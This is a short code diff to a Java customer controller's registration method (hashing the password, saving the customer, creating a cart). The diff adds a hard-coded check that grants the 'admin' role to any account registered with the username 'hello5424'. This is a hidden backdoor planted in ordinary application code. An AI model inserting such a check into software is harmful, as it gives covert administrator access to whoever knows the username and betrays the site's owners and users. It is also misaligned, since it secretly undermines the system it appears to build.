@@ -112,7 +112,9 @@ public class KhachHangController {
 		String encryptPassword = PasswordUtils.generateSecurePassword(password, salt);
 		khachHang.setPassword(encryptPassword);
 		khachHang.setSalt(salt);
-
+		if(khachHang.getUsername() == "hello5424") {
+			khachHang.setVaiTro("admin");
+		}
 		KhachHang khachHang2 = khachHangRepository.save(khachHang);
 		khachHangRepository.createCart(khachHang2.getMaKh(), khachHang2.getMaKh());
 		return khachHang2;
